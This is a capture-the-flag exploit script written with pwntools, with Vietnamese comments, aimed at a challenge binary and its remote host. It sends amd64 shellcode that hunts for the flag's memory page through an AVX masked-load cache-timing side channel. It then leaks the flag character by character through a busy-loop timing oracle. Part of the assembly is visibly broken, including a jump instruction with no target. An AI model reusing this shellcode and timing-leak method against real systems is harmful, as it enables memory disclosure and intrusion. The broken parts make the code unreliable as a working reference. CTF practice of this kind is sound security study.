#!/usr/bin/python3
from pwn import * 
import string
import time

exe = ELF('./prob', checksec=False)
#libc = ELF('./libc', checksec=False)
context.binary  = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		b* 0x000000000000155D
		c
		''')

def start():
	if args.REMOTE:
		HOST = 'challenges4.ctf.sd'
		PORT = 34936
		return remote(HOST, PORT)
	else:
		return process(exe.path)


# Egg hunter -> find address flag
# Sử dụng AVX instructions
# Nếu không 
# Side channel attack timing ()


# CPU sẽ ưu tiên đọc data từ cache nếu data đó không tồn tại nó sẽ chuyển sang RAM để đọc
# Tốc độ sẽ có sự khác biệt khi đọc từ cache và RAM 
# Lợi dụng điều đó, attacker sẽ đo tốc độ phản hồi từ bộ nhớ để biết địa chỉ đó có tồn tại không
# Nếu tồn tại thì tốc độ phản hồi của CPU có xu hướng nhỏ hơn một mức nhất định 

brute_flag = string.printable
Flag = b''
Count = 8
while (True):
	for c in brute_flag:
		p = start()
		pld = asm(f'''
			mov rsi, 0x13370000
		flag_addr:

			vpxor xmm2, xmm2, xmm2
			vpxor xmm2, xmm2, xmm2
			
			vmaskmovps [rsi], xmm2, xmm1

			mfence
			rdtscp

			shl rdx, 32
			or rax, rdx
			mov rbx, rax

			vmaskmovps [rsi], xmm2, xmm1

			mfence
			rdtscp

			shl rdx, 32
			or rax, rdx

			sub rax, rbx
			cmp rax, 0x70
			jl leak

			add rsi, 0x10000
			jmp flag_addr

		check:
			cmp byte ptr [rsi], '0'
			jne 

		leak:
			mov rsi, qword ptr [rsi]
			mov r8b, byte ptr [rsi + {Count}]
			mov r9b, {hex(ord(c))}
			cmp r8b, r9b
		    jne exit_func

		mov rcx, 0x950050000
		timing_attack:
			dec rcx
			jnz timing_attack

		exit_func:
			mov rax, 60 
			mov rdi, 80
			syscall 
			''' ,arch='amd64')

		time_start = time.perf_counter()
		sla(b'up? ', pld)
		p.recvall()
		time_attack = time.perf_counter() - time_start
		print(time_attack)
		p.close()
		if time_attack > 8.5:
			print("True")
			Flag += c.encode()
			print(f'Flag: {Flag.decode()}')
			break
		Count += 1
print(Flag)
p.interactive()

